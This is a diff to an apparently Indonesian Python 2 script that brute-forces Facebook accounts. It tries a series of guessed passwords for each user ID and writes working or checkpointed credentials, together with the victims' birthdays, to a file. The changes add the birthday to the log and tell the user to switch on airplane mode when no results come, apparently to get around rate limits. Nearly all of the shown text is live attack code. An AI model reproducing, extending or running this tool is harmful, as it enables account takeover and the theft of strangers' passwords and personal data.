@@ -248,10 +248,11 @@ def pilih_indo():
 	print "\033[1;97m Total ID : "+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97m Crack Otw  "+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;97m Otw Crack "+o),;sys.stdout.flush();time.sleep(1)
 
 	print "\n\033[1;97m _______________________________________"
-	print "\033[1;97m Pencet CTRL+Z untuk berhenti :)"
+	print "\033[1;97m Pencet CTRL+Z untuk berhenti,"
+	print "\033[1;97m Mode Pesawat jika tidak ada hasil"
 	print "\033[1;97m _______________________________________"
 	
 ##### MAIN INDONESIA #####
@@ -277,7 +278,7 @@ def pilih_indo():
 				if 'www.facebook.com' in w['error_msg']:
 					print '\033[1;93m --> ' + user + '|' + pass1 + '|' + c['birthday']
 					cek = open("out/super_cp.txt", "a")
-					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
+					cek.write("\nID:" +user+ " Pw:" +pass1+ " TTL:" +c['birthday'])
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
@@ -293,7 +294,7 @@ def pilih_indo():
 						if 'www.facebook.com' in w['error_msg']:
 							print '\033[1;93m --> ' + user + '|' + pass2 + '|' + c['birthday']
 							cek = open("out/super_cp.txt", "a")
-							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
+							cek.write("\nID:" +user+ " Pw:" +pass2+ " TTL:" +c['birthday'])
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
@@ -309,7 +310,7 @@ def pilih_indo():
 								if 'www.facebook.com' in w['error_msg']:
 									print '\033[1;93m --> ' + user + '|' + pass3 + '|' + c['birthday']
 									cek = open("out/super_cp.txt", "a")
-									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
+									cek.write("\nID:" +user+ " Pw:" +pass3+ " TTL:" +c['birthday'])
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
@@ -325,7 +326,7 @@ def pilih_indo():
 										if 'www.facebook.com' in w['error_msg']:
 											print '\033[1;93m --> ' + user + '|' + pass4 + '|' + c['birthday']
 											cek = open("out/super_cp.txt", "a")
-											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
+											cek.write("\nID:" +user+ " Pw:" +pass4+ " TTL:" +c['birthday'])
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
@@ -341,7 +342,7 @@ def pilih_indo():
 												if 'www.facebook.com' in w['error_msg']:
 													print '\033[1;93m --> ' + user + '|' + pass5 + '|' + c['birthday']
 													cek = open("out/super_cp.txt", "a")
-													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
+													cek.write("\nID:" +user+ " Pw:" +pass5+ " TTL:" +c['birthday'])
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
@@ -357,7 +358,7 @@ def pilih_indo():
 														if 'www.facebook.com' in w['error_msg']:
 															print '\033[1;93m --> ' + user + '|' + pass6 + '|' + c['birthday']
 															cek = open("out/super_cp.txt", "a")
-															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
+															cek.write("\nID:" +user+ " Pw:" +pass6+ " TTL:" +c['birthday'])
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
@@ -373,7 +374,7 @@ def pilih_indo():
 																if 'www.facebook.com' in w['error_msg']:
 																	print '\033[1;93m --> ' + user + '|' + pass7 + '|' + c['birthday']
 																	cek = open("out/super_cp.txt", "a")
-																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
+																	cek.write("\nID:" +user+ " Pw:" +pass7+ " TTL:" +c['birthday'])
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																else:
@@ -389,7 +390,7 @@ def pilih_indo():
 																		if 'www.facebook.com' in w['error_msg']:
 																			print '\033[1;93m --> ' + user + '|' + pass8 + '|' + c['birthday']
 																			cek = open("out/super_cp.txt", "a")
-																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
+																			cek.write("\nID:" +user+ " Pw:" +pass8+ " TTL:" +c['birthday'])
 																			cek.close()
 																			cekpoint.append(user+pass8)
 																		else:
@@ -405,7 +406,7 @@ def pilih_indo():
 																					if 'www.facebook.com' in w['error_msg']:
 																						print '\033[1;93m --> ' + user + '|' + pass9 + '|' + c['birthday']
 																						cek = open("out/super_cp.txt", "a")
-																						cek.write("ID:" +user+ " Pw:" +pass9+"\n")
+																						cek.write("\nID:" +user+ " Pw:" +pass9+ " TTL:" +c['birthday'])
 																						cek.close()
 																						cekpoint.append(user+pass9)
 																					else:
@@ -421,7 +422,7 @@ def pilih_indo():
 																							if 'www.facebook.com' in w['error_msg']:
 																								print '\033[1;93m --> ' + user + '|' + pass10 + '|' + c['birthday']
 																								cek = open("out/super_cp.txt", "a")
-																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
+																								cek.write("\nID:" +user+ " Pw:" +pass10+ " TTL:" +c['birthday'])
 																								cek.close()
 																								cekpoint.append(user+pass10)
 																							else:
@@ -437,7 +438,7 @@ def pilih_indo():
 																									if 'www.facebook.com' in w['error_msg']:
 																										print '\033[1;93m --> ' + user + '|' + pass11 + '|' + c['birthday']
 																										cek = open("out/super_cp.txt", "a")
-																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
+																										cek.write("\nID:" +user+ " Pw:" +pass11+ " TTL:" +c['birthday'])
 																										cek.close()
 																										cekpoint.append(user+pass11)
 																									else:
@@ -451,9 +452,9 @@ def pilih_indo():
 																											oks.append(user+pass12)
 																										else:
 																											if 'www.facebook.com' in w['error_msg']:
-																												print '\033[1;93m --> ' + user + '|' + pass13 + '|' + c['birthday']
+																												print '\033[1;93m --> ' + user + '|' + pass12 + '|' + c['birthday']
 																												cek = open("out/super_cp.txt", "a")
-																												cek.write("ID:" +user+ " Pw:" +pass12+ "\n")
+																												cek.write("\nID:" +user+ " Pw:" +pass12+ " TTL:" +c['birthday'])
 																												cek.close()
 																												cekpoint.append(user+pass12)
 		except:
@@ -485,4 +486,3 @@ def id_gen():
 if __name__=='__main__':
     menu()
     masuk()
-        
